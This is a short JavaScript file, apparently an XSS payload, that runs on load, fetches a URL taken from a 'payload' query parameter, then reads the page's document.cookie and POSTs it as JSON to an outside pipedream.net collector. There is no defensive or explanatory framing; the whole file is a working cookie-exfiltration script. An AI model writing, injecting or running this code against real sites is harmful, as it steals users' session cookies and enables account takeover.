// Extracting the payload parameter value from the URL
const urlParams = new URLSearchParams(window.location.search);
const payload = urlParams.get('payload');

// Function to fetch document.cookie value from the provided website
const fetchCookieValue = async () => {
    try {
        const response = await fetch(payload);
        const cookieValue = document.cookie;
        
        // Send the cookie value to another website
        await fetch('https://eoztzzeai0gupst.m.pipedream.net', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ cookie: cookieValue }),
        });

        console.log("Cookie Value:", cookieValue);
        console.log("Cookie value sent to another website.");
    } catch (error) {
        console.error("Error fetching or sending cookie value:", error);
    }
};

// Call the fetchCookieValue function when the script is loaded
fetchCookieValue();
